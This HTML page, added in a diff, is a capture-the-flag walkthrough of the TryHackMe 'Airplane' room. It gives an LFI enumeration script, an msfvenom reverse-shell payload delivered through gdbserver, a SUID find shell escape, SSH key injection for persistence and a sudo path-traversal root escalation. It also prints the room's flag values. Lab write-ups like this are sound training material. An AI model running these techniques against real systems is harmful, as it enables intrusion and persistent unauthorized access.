@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TryHackMe - Airplane Room Guide</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(30, 30, 46, 0.95);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            color: #00ff88;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 2.5em;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #888;
+            margin-bottom: 40px;
+            font-size: 1.1em;
+        }
+
+        h2 {
+            color: #ff6b6b;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #ff6b6b;
+            font-size: 1.8em;
+        }
+
+        h3 {
+            color: #4ecdc4;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            font-size: 1.4em;
+        }
+
+        h4 {
+            color: #ffd93d;
+            margin-top: 20px;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        p, li {
+            margin-bottom: 10px;
+        }
+
+        ul, ol {
+            margin-left: 30px;
+            margin-bottom: 20px;
+        }
+
+        code {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #ff79c6;
+            font-family: 'Courier New', monospace;
+        }
+
+        pre {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border-left: 4px solid #00ff88;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            color: #f8f8f2;
+        }
+
+        .flag {
+            background: rgba(255, 215, 0, 0.1);
+            border: 2px solid #ffd700;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: center;
+            font-family: 'Courier New', monospace;
+        }
+
+        .flag-label {
+            color: #ffd700;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .flag-value {
+            color: #00ff88;
+            font-size: 1.2em;
+        }
+
+        .note {
+            background: rgba(78, 205, 196, 0.1);
+            border-left: 4px solid #4ecdc4;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+
+        .warning {
+            background: rgba(255, 107, 107, 0.1);
+            border-left: 4px solid #ff6b6b;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+
+        .success {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid #00ff88;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+
+        .phase {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            margin: 30px 0;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .attack-chain {
+            background: linear-gradient(90deg, rgba(255, 107, 107, 0.2), rgba(78, 205, 196, 0.2));
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+
+        .attack-chain ol {
+            counter-reset: item;
+            list-style-type: none;
+        }
+
+        .attack-chain li {
+            counter-increment: item;
+            margin-bottom: 15px;
+            padding-left: 40px;
+            position: relative;
+        }
+
+        .attack-chain li:before {
+            content: counter(item);
+            background: #ff6b6b;
+            color: white;
+            font-weight: bold;
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .command-output {
+            background: #0a0a0f;
+            color: #00ff88;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            margin: 15px 0;
+        }
+
+        a {
+            color: #4ecdc4;
+            text-decoration: none;
+        }
+
+        a:hover {
+            color: #00ff88;
+            text-decoration: underline;
+        }
+
+        .toc {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+        }
+
+        .toc ul {
+            list-style-type: none;
+        }
+
+        .toc li {
+            padding: 5px 0;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 2em;
+            }
+
+            h2 {
+                font-size: 1.5em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>✈️ TryHackMe - Airplane Room</h1>
+        <p class="subtitle">Complete Walkthrough & Guide</p>
+
+        <div class="toc">
+            <h3>📋 Table of Contents</h3>
+            <ul>
+                <li><a href="#overview">Overview</a></li>
+                <li><a href="#phase1">Phase 1: Initial Enumeration & LFI Exploitation</a></li>
+                <li><a href="#phase2">Phase 2: Exploiting gdbserver</a></li>
+                <li><a href="#phase3">Phase 3: Privilege Escalation to Carlos</a></li>
+                <li><a href="#phase4">Phase 4: SSH Key Injection</a></li>
+                <li><a href="#phase5">Phase 5: Root Privilege Escalation</a></li>
+                <li><a href="#summary">Summary & Flags</a></li>
+            </ul>
+        </div>
+
+        <div id="overview">
+            <h2>🎯 Overview</h2>
+            <p>The Airplane room involves multiple stages of exploitation including:</p>
+            <ul>
+                <li>Local File Inclusion (LFI) vulnerability</li>
+                <li>gdbserver exploitation for initial access</li>
+                <li>SUID binary abuse for lateral movement</li>
+                <li>SSH key injection for stable shell</li>
+                <li>Sudo misconfiguration exploitation for root access</li>
+            </ul>
+
+            <div class="note">
+                <strong>💡 Note:</strong> This guide assumes you have basic knowledge of Linux, networking, and penetration testing concepts.
+            </div>
+        </div>
+
+        <div id="phase1" class="phase">
+            <h2>Phase 1: Initial Enumeration & LFI Exploitation</h2>
+
+            <h3>Step 1: Discovering the LFI Vulnerability</h3>
+            <p>The web application running on port 8000 has a Local File Inclusion vulnerability that allows reading system files through the <code>page</code> parameter.</p>
+
+            <h3>Step 2: Creating the Exploitation Script</h3>
+            <p>Create a Python script to automate LFI exploitation and enumerate running processes:</p>
+
+            <pre><code>import requests
+
+def read_file(base_url, path):
+    file_url = f"{base_url}/?page=../../../../{path}"
+    try:
+        response = requests.get(file_url)
+        if response.status_code == 200:
+            return response.text
+        return None
+    except Exception as e:
+        print(f"Error: {e}")
+        return None
+
+def find_pid_by_port(base_url, port):
+    for pid in range(1, 5000):
+        cmdline = read_file(base_url, f"proc/{pid}/cmdline")
+        if cmdline and str(port) in cmdline:
+            return pid
+    return None
+
+base_url = 'http://airplane.thm:8000'
+port = '6048'
+
+pid = find_pid_by_port(base_url, port)
+
+if pid:
+    cmdline = read_file(base_url, f"proc/{pid}/cmdline")
+    print(f'PID: {pid}')
+    print(f'Command: {cmdline}')
+else:
+    print('No process found')</code></pre>
+
+            <h3>Step 3: Running the Script</h3>
+            <pre><code>python3 script.py</code></pre>
+
+            <div class="command-output">
+PID: 529
+Command: /usr/bin/gdbserver0.0.0.0:6048airplane
+            </div>
+
+            <div class="success">
+                <strong>✅ Success:</strong> Discovered that <code>gdbserver</code> is running on port 6048, which can be exploited for remote code execution.
+            </div>
+        </div>
+
+        <div id="phase2" class="phase">
+            <h2>Phase 2: Exploiting gdbserver</h2>
+
+            <h3>Step 4: Generating the Reverse Shell Payload</h3>
+            <p>Use <code>msfvenom</code> to create a reverse shell payload:</p>
+
+            <pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.67.79.81 LPORT=4444 -f elf -o /tmp/payload.elf
+chmod +x /tmp/payload.elf</code></pre>
+
+            <div class="note">
+                <strong>💡 Note:</strong> Replace <code>10.67.79.81</code> with your TryHackMe VPN IP address (tun0).
+            </div>
+
+            <h3>Step 5: Setting Up the Listener</h3>
+            <p>In a separate terminal, start a netcat listener:</p>
+
+            <pre><code>nc -lvnp 4444</code></pre>
+
+            <h3>Step 6: Uploading and Executing via gdb</h3>
+            <p>Connect to the gdbserver and upload/execute the payload:</p>
+
+            <pre><code>gdb -q
+target extended-remote airplane.thm:6048
+remote put /tmp/payload.elf /tmp/payload.elf
+set remote exec-file /tmp/payload.elf
+run
+quit</code></pre>
+
+            <div class="command-output">
+Connection received on 10.67.137.2 37626
+$ whoami
+hudson
+            </div>
+
+            <div class="success">
+                <strong>✅ Initial Access:</strong> Successfully obtained a shell as user <code>hudson</code>!
+            </div>
+        </div>
+
+        <div id="phase3" class="phase">
+            <h2>Phase 3: Privilege Escalation to Carlos</h2>
+
+            <h3>Step 7: Enumerating SUID Binaries</h3>
+            <p>Search for SUID binaries that might be exploitable:</p>
+
+            <pre><code>find / -type f -perm -4000 2>/dev/null</code></pre>
+
+            <div class="warning">
+                <strong>🔍 Key Finding:</strong> The <code>/usr/bin/find</code> binary has the SUID bit set and is owned by user <code>carlos</code>.
+            </div>
+
+            <h3>Step 8: Exploiting SUID Find (GTFOBins)</h3>
+            <p>Consult <a href="https://gtfobins.github.io/gtfobins/find/" target="_blank">GTFOBins</a> for the SUID exploitation technique:</p>
+
+            <pre><code>/usr/bin/find . -exec /bin/sh -p \; -quit</code></pre>
+
+            <div class="note">
+                <strong>💡 Explanation:</strong> The <code>-p</code> flag is critical as it preserves the elevated privileges from the SUID bit.
+            </div>
+
+            <div class="command-output">
+$ whoami
+carlos
+
+$ id
+uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
+            </div>
+
+            <h3>Step 9: Capturing the User Flag</h3>
+            <pre><code>cat user.txt</code></pre>
+
+            <div class="flag">
+                <div class="flag-label">🚩 USER FLAG</div>
+                <div class="flag-value">eebfca2ca5a2b8a56c46c781aeea7562</div>
+            </div>
+        </div>
+
+        <div id="phase4" class="phase">
+            <h2>Phase 4: SSH Key Injection for Stable Shell</h2>
+
+            <h3>Step 10: Generating SSH Key Pair</h3>
+            <p>On your attacking machine, generate an SSH key pair:</p>
+
+            <pre><code>ssh-keygen -t rsa -f /tmp/carlos_key
+cat /tmp/carlos_key.pub</code></pre>
+
+            <div class="command-output">
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwIS98h8M9Kgs1FlyI/f+L9E72KDXRwoDaIV7wfBwgyrXK8Ggm0QVNJIHqZOYqycYD1UZZqjXqXTepwpJ7V1FnCJCipPXDiq6J+14L3loY/d2zFl3++jGbUl8wC0xkE/iRGpkQ0cDXlTJMPoEPFkqlgDPNo8LbX7epJ/WkjSQC9O4EsdhLzh77NIuF3zAP9pmX9s0WmHi7WYCD4v86Kd3cAu0EzfAwilUu/eaZf1peqCo8hzWcdmANab5I6qI0lhQ+qIv5VzfUdRXMCBrZKp1K91FMt4sTr4hD7AaI4NMCJKrmCmZvtBM1BKYzL//tiPVYCEYOpu5lJEg1J2itRLMOtDdz06mW6KER2H1a5Uzmr/qy7/tjJV6taEZHfNujaWWUzsGSGAi2mJDLVQ6+o999q6EeJz6tHZCf61rM9ZhmTIimbS3Kg7S0A3Gxli7BArZRBl6Ek/98wpbSuTuYAH4b6deADEPgz2wvGop7OaaQ2yX/JJG0IAli6FtlGezcwQE= root@ip-10-67-79-81
+            </div>
+
+            <h3>Step 11: Adding Public Key to authorized_keys</h3>
+            <p>In the carlos shell (with euid), create the SSH directory and add your public key:</p>
+
+            <pre><code>cd /home/carlos
+mkdir -p .ssh
+chmod 700 .ssh
+echo "YOUR_PUBLIC_KEY_HERE" > .ssh/authorized_keys
+chmod 600 .ssh/authorized_keys
+ls -la .ssh/</code></pre>
+
+            <div class="warning">
+                <strong>⚠️ Important:</strong> Replace <code>YOUR_PUBLIC_KEY_HERE</code> with the actual public key from the previous step.
+            </div>
+
+            <h3>Step 12: SSH Connection</h3>
+            <p>Connect via SSH from your attacking machine:</p>
+
+            <pre><code>ssh -i /tmp/carlos_key carlos@airplane.thm</code></pre>
+
+            <div class="success">
+                <strong>✅ Stable Shell:</strong> Successfully obtained a proper SSH shell as <code>carlos</code>!
+            </div>
+        </div>
+
+        <div id="phase5" class="phase">
+            <h2>Phase 5: Root Privilege Escalation</h2>
+
+            <h3>Step 13: Checking Sudo Privileges</h3>
+            <p>Check what commands carlos can run as root:</p>
+
+            <pre><code>sudo -l</code></pre>
+
+            <div class="command-output">
+Matching Defaults entries for carlos on airplane:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User carlos may run the following commands on airplane:
+    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
+            </div>
+
+            <div class="warning">
+                <strong>🔍 Vulnerability Found:</strong> Carlos can execute any Ruby script in <code>/root/</code> as root without a password!
+            </div>
+
+            <h3>Step 14: Creating Malicious Ruby Script</h3>
+            <p>Create a Ruby script that spawns a root shell:</p>
+
+            <pre><code>echo 'exec "/bin/sh"' > /tmp/final.rb</code></pre>
+
+            <h3>Step 15: Path Traversal Exploitation</h3>
+            <p>Exploit the sudo rule using path traversal to execute our script in <code>/tmp</code>:</p>
+
+            <pre><code>sudo /usr/bin/ruby /root/../tmp/final.rb</code></pre>
+
+            <div class="note">
+                <strong>💡 How it works:</strong>
+                <ul>
+                    <li><code>/root/../tmp/final.rb</code> resolves to <code>/tmp/final.rb</code></li>
+                    <li>Sudo sees it as matching the pattern <code>/root/*.rb</code></li>
+                    <li>The Ruby <code>exec</code> function spawns a root shell</li>
+                </ul>
+            </div>
+
+            <div class="command-output">
+# whoami
+root
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+            </div>
+
+            <div class="success">
+                <strong>✅ ROOT ACCESS ACHIEVED!</strong>
+            </div>
+
+            <h3>Step 16: Capturing the Root Flag</h3>
+            <pre><code>cd /root
+cat root.txt</code></pre>
+
+            <div class="flag">
+                <div class="flag-label">🚩 ROOT FLAG</div>
+                <div class="flag-value">190dcbeb688ce5fe029f26a1e5fce002</div>
+            </div>
+        </div>
+
+        <div id="summary" class="phase">
+            <h2>📊 Summary</h2>
+
+            <h3>Captured Flags</h3>
+            <div class="flag">
+                <div class="flag-label">🚩 USER FLAG</div>
+                <div class="flag-value">eebfca2ca5a2b8a56c46c781aeea7562</div>
+            </div>
+
+            <div class="flag">
+                <div class="flag-label">🚩 ROOT FLAG</div>
+                <div class="flag-value">190dcbeb688ce5fe029f26a1e5fce002</div>
+            </div>
+
+            <h3>Attack Chain</h3>
+            <div class="attack-chain">
+                <ol>
+                    <li><strong>LFI Vulnerability</strong> → Discovered gdbserver running on port 6048</li>
+                    <li><strong>gdbserver Exploitation</strong> → Gained initial shell as user <code>hudson</code></li>
+                    <li><strong>SUID Binary Abuse</strong> (<code>/usr/bin/find</code>) → Lateral movement to <code>carlos</code></li>
+                    <li><strong>SSH Key Injection</strong> → Established stable shell as <code>carlos</code></li>
+                    <li><strong>Sudo Ruby Exploitation</strong> (path traversal) → Achieved <code>root</code> access</li>
+                </ol>
+            </div>
+
+            <h3>Key Techniques Used</h3>
+            <ul>
+                <li><strong>Local File Inclusion (LFI)</strong> - Reading system files via web vulnerability</li>
+                <li><strong>Process Enumeration</strong> - Using <code>/proc</code> filesystem to discover services</li>
+                <li><strong>gdbserver RCE</strong> - Remote code execution through debug server</li>
+                <li><strong>SUID Exploitation</strong> - Leveraging misconfigured SUID binaries (GTFOBins)</li>
+                <li><strong>SSH Key Authentication</strong> - Persistence through authorized_keys injection</li>
+                <li><strong>Path Traversal</strong> - Bypassing sudo restrictions with <code>../</code></li>
+                <li><strong>Sudo Misconfiguration</strong> - Exploiting overly permissive sudo rules</li>
+            </ul>
+
+            <h3>Tools & Resources</h3>
+            <ul>
+                <li><strong>msfvenom</strong> - Payload generation</li>
+                <li><strong>gdb</strong> - Debugging and exploitation</li>
+                <li><strong>netcat</strong> - Reverse shell listener</li>
+                <li><strong>ssh-keygen</strong> - SSH key generation</li>
+                <li><strong>GTFOBins</strong> - Unix binary exploitation reference</li>
+            </ul>
+
+            <div class="success">
+                <h3>🎉 Congratulations!</h3>
+                <p>You have successfully completed the Airplane room! This box demonstrated a realistic attack chain involving web vulnerabilities, service exploitation, privilege escalation, and persistence techniques.</p>
+            </div>
+
+            <div class="note">
+                <strong>📚 Learning Points:</strong>
+                <ul>
+                    <li>Always enumerate running services and their configurations</li>
+                    <li>LFI vulnerabilities can lead to information disclosure and further exploitation</li>
+                    <li>SUID binaries are common privilege escalation vectors</li>
+                    <li>Check GTFOBins for exploitation techniques on common binaries</li>
+                    <li>Sudo misconfigurations can be bypassed with creative path manipulation</li>
+                    <li>Maintaining persistence through SSH keys is crucial for stable access</li>
+                </ul>
+            </div>
+        </div>
+
+        <footer style="text-align: center; margin-top: 50px; padding-top: 30px; border-top: 1px solid rgba(255,255,255,0.1); color: #888;">
+            <p>TryHackMe - Airplane Room Walkthrough</p>
+            <p>Created: February 2026</p>
+            <p style="margin-top: 10px;">Happy Hacking! 🔐</p>
+        </footer>
+    </div>
+</body>
+</html>
